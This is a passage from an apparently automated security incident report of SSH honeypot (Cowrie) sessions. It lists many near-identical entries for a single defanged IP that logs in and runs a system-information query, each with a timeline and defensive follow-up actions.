- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-edde2cf3a567

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 18:21 |
| **Last Seen** | 2026-09-05 18:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 18:21:50` | `cowrie.session.connect` |
| `2026-09-05 18:21:50` | `cowrie.client.version` |
| `2026-09-05 18:21:50` | `cowrie.client.kex` |
| `2026-09-05 18:21:50` | `cowrie.login.success` |
| `2026-09-05 18:21:50` | `cowrie.session.params` |
| `2026-09-05 18:21:50` | `cowrie.command.input` |
| `2026-09-05 18:21:50` | `cowrie.log.closed` |
| `2026-09-05 18:21:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-50a970dc8691

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 18:22 |
| **Last Seen** | 2026-09-05 18:22 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 18:22:04` | `cowrie.session.connect` |
| `2026-09-05 18:22:04` | `cowrie.client.version` |
| `2026-09-05 18:22:04` | `cowrie.client.kex` |
| `2026-09-05 18:22:04` | `cowrie.login.success` |
| `2026-09-05 18:22:05` | `cowrie.session.params` |
| `2026-09-05 18:22:05` | `cowrie.command.input` |
| `2026-09-05 18:22:05` | `cowrie.log.closed` |
| `2026-09-05 18:22:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f7051cbd2c70

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 18:22 |
| **Last Seen** | 2026-09-05 18:22 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 18:22:19` | `cowrie.session.connect` |
| `2026-09-05 18:22:19` | `cowrie.client.version` |
| `2026-09-05 18:22:19` | `cowrie.client.kex` |
| `2026-09-05 18:22:19` | `cowrie.login.success` |
| `2026-09-05 18:22:20` | `cowrie.session.params` |
| `2026-09-05 18:22:20` | `cowrie.command.input` |
| `2026-09-05 18:22:20` | `cowrie.log.closed` |
| `2026-09-05 18:22:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-38670223cc31

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 18:22 |
| **Last Seen** | 2026-09-05 18:22 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 18:22:34` | `cowrie.session.connect` |
| `2026-09-05 18:22:34` | `cowrie.client.version` |
| `2026-09-05 18:22:34` | `cowrie.client.kex` |
| `2026-09-05 18:22:34` | `cowrie.login.success` |
| `2026-09-05 18:22:35` | `cowrie.session.params` |
| `2026-09-05 18:22:35` | `cowrie.command.input` |
| `2026-09-05 18:22:35` | `cowrie.log.closed` |
| `2026-09-05 18:22:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5d386d3c6022

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 18:22 |
| **Last Seen** | 2026-09-05 18:22 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 18:22:48` | `cowrie.session.connect` |
| `2026-09-05 18:22:48` | `cowrie.client.version` |
| `2026-09-05 18:22:48` | `cowrie.client.kex` |
| `2026-09-05 18:22:49` | `cowrie.login.success` |
| `2026-09-05 18:22:49` | `cowrie.session.params` |
| `2026-09-05 18:22:49` | `cowrie.command.input` |
| `2026-09-05 18:22:49` | `cowrie.log.closed` |
| `2026-09-05 18:22:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b4b8b27d92de

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 18:23 |
| **Last Seen** | 2026-09-05 18:23 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 18:23:03` | `cowrie.session.connect` |
| `2026-09-05 18:23:03` | `cowrie.client.version` |
| `2026-09-05 18:23:03` | `cowrie.client.kex` |
| `2026-09-05 18:23:03` | `cowrie.login.success` |
| `2026-09-05 18:23:04` | `cowrie.session.params` |
| `2026-09-05 18:23:04` | `cowrie.command.input` |
| `2026-09-05 18:23:04` | `cowrie.log.closed` |
| `2026-09-05 18:23:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6769b9792868

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 18:23 |
| **Last Seen** | 2026-09-05 18:23 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 18:23:18` | `cowrie.session.connect` |
| `2026-09-05 18:23:18` | `cowrie.client.version` |
| `2026-09-05 18:23:18` | `cowrie.client.kex` |
| `2026-09-05 18:23:18` | `cowrie.login.success` |
| `2026-09-05 18:23:18` | `cowrie.session.params` |
| `2026-09-05 18:23:18` | `cowrie.command.input` |
| `2026-09-05 18:23:18` | `cowrie.log.closed` |
| `2026-09-05 18:23:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-263fdcb33c5e

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 18:23 |
| **Last Seen** | 2026-09-05 18:23 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 18:23:32` | `cowrie.session.connect` |
| `2026-09-05 18:23:32` | `cowrie.client.version` |
| `2026-09-05 18:23:32` | `cowrie.client.kex` |
| `2026-09-05 18:23:32` | `cowrie.login.success` |
| `2026-09-05 18:23:33` | `cowrie.session.params` |
| `2026-09-05 18:23:33` | `cowrie.command.input` |
| `2026-09-05 18:23:33` | `cowrie.log.closed` |
| `2026-09-05 18:23:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0917ae07ce73

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 18:23 |
| **Last Seen** | 2026-09-05 18:23 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 18:23:47` | `cowrie.session.connect` |
| `2026-09-05 18:23:47` | `cowrie.client.version` |
| `2026-09-05 18:23:47` | `cowrie.client.kex` |
| `2026-09-05 18:23:47` | `cowrie.login.success` |
| `2026-09-05 18:23:48` | `cowrie.session.params` |
| `2026-09-05 18:23:48` | `cowrie.command.input` |
| `2026-09-05 18:23:48` | `cowrie.log.closed` |
| `2026-09-05 18:23:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-61279e6a43f2

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 18:24 |
| **Last Seen** | 2026-09-05 18:24 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 18:24:02` | `cowrie.session.connect` |
| `2026-09-05 18:24:02` | `cowrie.client.version` |
| `2026-09-05 18:24:02` | `cowrie.client.kex` |
| `2026-09-05 18:24:02` | `cowrie.login.success` |
| `2026-09-05 18:24:03` | `cowrie.session.params` |
| `2026-09-05 18:24:03` | `cowrie.command.input` |
| `2026-09-05 18:24:03` | `cowrie.log.closed` |
| `2026-09-05 18:24:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ce30840c40cd

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 18:24 |
| **Last Seen** | 2026-09-05 18:24 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 18:24:17` | `cowrie.session.connect` |
| `2026-09-05 18:24:17` | `cowrie.client.version` |
| `2026-09-05 18:24:17` | `cowrie.client.kex` |
| `2026-09-05 18:24:17` | `cowrie.login.success` |
| `2026-09-05 18:24:18` | `cowrie.session.params` |
| `2026-09-05 18:24:18` | `cowrie.command.input` |
| `2026-09-05 18:24:18` | `cowrie.log.closed` |
| `2026-09-05 18:24:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b05e4ab0a972

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 18:24 |
| **Last Seen** | 2026-09-05 18:24 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 18:24:32` | `cowrie.session.connect` |
| `2026-09-05 18:24:32` | `cowrie.client.version` |
| `2026-09-05 18:24:32` | `cowrie.client.kex` |
| `2026-09-05 18:24:32` | `cowrie.login.success` |
| `2026-09-05 18:24:33` | `cowrie.session.params` |
| `2026-09-05 18:24:33` | `cowrie.command.input` |
| `2026-09-05 18:24:33` | `cowrie.log.closed` |
| `2026-09-05 18:24:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a6da751efed7

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 18:24 |
| **Last Seen** | 2026-09-05 18:24 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 18:24:47` | `cowrie.session.connect` |
| `2026-09-05 18:24:47` | `cowrie.client.version` |
| `2026-09-05 18:24:47` | `cowrie.client.kex` |
| `2026-09-05 18:24:48` | `cowrie.login.success` |
| `2026-09-05 18:24:48` | `cowrie.session.params` |
| `2026-09-05 18:24:48` | `cowrie.command.input` |
| `2026-09-05 18:24:48` | `cowrie.log.closed` |
| `2026-09-05 18:24:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2c7af6e85b0e

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 18:25 |
| **Last Seen** | 2026-09-05 18:25 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 18:25:02` | `cowrie.session.connect` |
| `2026-09-05 18:25:02` | `cowrie.client.version` |
| `2026-09-05 18:25:02` | `cowrie.client.kex` |
| `2026-09-05 18:25:02` | `cowrie.login.success` |
| `2026-09-05 18:25:03` | `cowrie.session.params` |
| `2026-09-05 18:25:03` | `cowrie.command.input` |
| `2026-09-05 18:25:03` | `cowrie.log.closed` |
| `2026-09-05 18:25:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-89eef33aa8f8

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 18:25 |
| **Last Seen** | 2026-09-05 18:25 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 18:25:18` | `cowrie.session.connect` |
| `2026-09-05 18:25:18` | `cowrie.client.version` |
| `2026-09-05 18:25:18` | `cowrie.client.kex` |
| `2026-09-05 18:25:18` | `cowrie.login.success` |
| `2026-09-05 18:25:18` | `cowrie.session.params` |
| `2026-09-05 18:25:18` | `cowrie.command.input` |
| `2026-09-05 18:25:18` | `cowrie.log.closed` |
| `2026-09-05 18:25:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5f3f2957eb8a

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 18:25 |
| **Last Seen** | 2026-09-05 18:25 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 18:25:33` | `cowrie.session.connect` |
| `2026-09-05 18:25:33` | `cowrie.client.version` |
| `2026-09-05 18:25:33` | `cowrie.client.kex` |
| `2026-09-05 18:25:33` | `cowrie.login.success` |
| `2026-09-05 18:25:34` | `cowrie.session.params` |
| `2026-09-05 18:25:34` | `cowrie.command.input` |
| `2026-09-05 18:25:34` | `cowrie.log.closed` |
| `2026-09-05 18:25:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9bce454314b2

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 18:25 |
| **Last Seen** | 2026-09-05 18:25 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 18:25:48` | `cowrie.session.connect` |
| `2026-09-05 18:25:48` | `cowrie.client.version` |
| `2026-09-05 18:25:48` | `cowrie.client.kex` |
| `2026-09-05 18:25:48` | `cowrie.login.success` |
| `2026-09-05 18:25:49` | `cowrie.session.params` |
| `2026-09-05 18:25:49` | `cowrie.command.input` |
| `2026-09-05 18:25:49` | `cowrie.log.closed` |
| `2026-09-05 18:25:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-826c792388d8

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 18:26 |
| **Last Seen** | 2026-09-05 18:26 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 18:26:03` | `cowrie.session.connect` |
| `2026-09-05 18:26:03` | `cowrie.client.version` |
| `2026-09-05 18:26:03` | `cowrie.client.kex` |
| `2026-09-05 18:26:03` | `cowrie.login.success` |
| `2026-09-05 18:26:04` | `cowrie.session.params` |
| `2026-09-05 18:26:04` | `cowrie.command.input` |
| `2026-09-05 18:26:04` | `cowrie.log.closed` |
| `2026-09-05 18:26:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-583a51c482bf

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 18:26 |
| **Last Seen** | 2026-09-05 18:26 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 18:26:19` | `cowrie.session.connect` |
| `2026-09-05 18:26:19` | `cowrie.client.version` |
| `2026-09-05 18:26:19` | `cowrie.client.kex` |
| `2026-09-05 18:26:19` | `cowrie.login.success` |
| `2026-09-05 18:26:19` | `cowrie.session.params` |
| `2026-09-05 18:26:19` | `cowrie.command.input` |
| `2026-09-05 18:26:19` | `cowrie.log.closed` |
| `2026-09-05 18:26:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-119f9a61b6f8

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 18:26 |
| **Last Seen** | 2026-09-05 18:26 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 18:26:34` | `cowrie.session.connect` |
| `2026-09-05 18:26:34` | `cowrie.client.version` |
| `2026-09-05 18:26:34` | `cowrie.client.kex` |
| `2026-09-05 18:26:34` | `cowrie.login.success` |
| `2026-09-05 18:26:35` | `cowrie.session.params` |
| `2026-09-05 18:26:35` | `cowrie.command.input` |
| `2026-09-05 18:26:35` | `cowrie.log.closed` |
| `2026-09-05 18:26:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-04474657ef3e

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 18:26 |
| **Last Seen** | 2026-09-05 18:26 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 18:26:49` | `cowrie.session.connect` |
| `2026-09-05 18:26:49` | `cowrie.client.version` |
| `2026-09-05 18:26:49` | `cowrie.client.kex` |
| `2026-09-05 18:26:49` | `cowrie.login.success` |
| `2026-09-05 18:26:49` | `cowrie.session.params` |
| `2026-09-05 18:26:49` | `cowrie.command.input` |
| `2026-09-05 18:26:49` | `cowrie.log.closed` |
| `2026-09-05 18:26:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9ace61feacf1

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 18:27 |
| **Last Seen** | 2026-09-05 18:27 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 18:27:04` | `cowrie.session.connect` |
| `2026-09-05 18:27:04` | `cowrie.client.version` |
| `2026-09-05 18:27:04` | `cowrie.client.kex` |
| `2026-09-05 18:27:04` | `cowrie.login.success` |
| `2026-09-05 18:27:04` | `cowrie.session.params` |
| `2026-09-05 18:27:04` | `cowrie.command.input` |
| `2026-09-05 18:27:05` | `cowrie.log.closed` |
| `2026-09-05 18:27:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f895943d23b1

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 18:27 |
| **Last Seen** | 2026-09-05 18:27 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 18:27:19` | `cowrie.session.connect` |
| `2026-09-05 18:27:19` | `cowrie.client.version` |
| `2026-09-05 18:27:19` | `cowrie.client.kex` |
| `2026-09-05 18:27:19` | `cowrie.login.success` |
| `2026-09-05 18:27:19` | `cowrie.session.params` |
| `2026-09-05 18:27:19` | `cowrie.command.input` |
| `2026-09-05 18:27:19` | `cowrie.log.closed` |
| `2026-09-05 18:27:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-df7d594631fa

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 18:27 |
| **Last Seen** | 2026-09-05 18:27 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 18:27:33` | `cowrie.session.connect` |
| `2026-09-05 18:27:33` | `cowrie.client.version` |
| `2026-09-05 18:27:33` | `cowrie.client.kex` |
| `2026-09-05 18:27:33` | `cowrie.login.success` |
| `2026-09-05 18:27:34` | `cowrie.session.params` |
| `2026-09-05 18:27:34` | `cowrie.command.input` |
| `2026-09-05 18:27:34` | `cowrie.log.closed` |
| `2026-09-05 18:27:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-21fa055b8980

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 18:27 |
| **Last Seen** | 2026-09-05 18:27 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 18:27:48` | `cowrie.session.connect` |
| `2026-09-05 18:27:48` | `cowrie.client.version` |
| `2026-09-05 18:27:48` | `cowrie.client.kex` |
| `2026-09-05 18:27:48` | `cowrie.login.success` |
| `2026-09-05 18:27:49` | `cowrie.session.params` |
| `2026-09-05 18:27:49` | `cowrie.command.input` |
| `2026-09-05 18:27:49` | `cowrie.log.closed` |
| `2026-09-05 18:27:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cec32cc3e7b7

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 18:28 |
| **Last Seen** | 2026-09-05 18:28 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
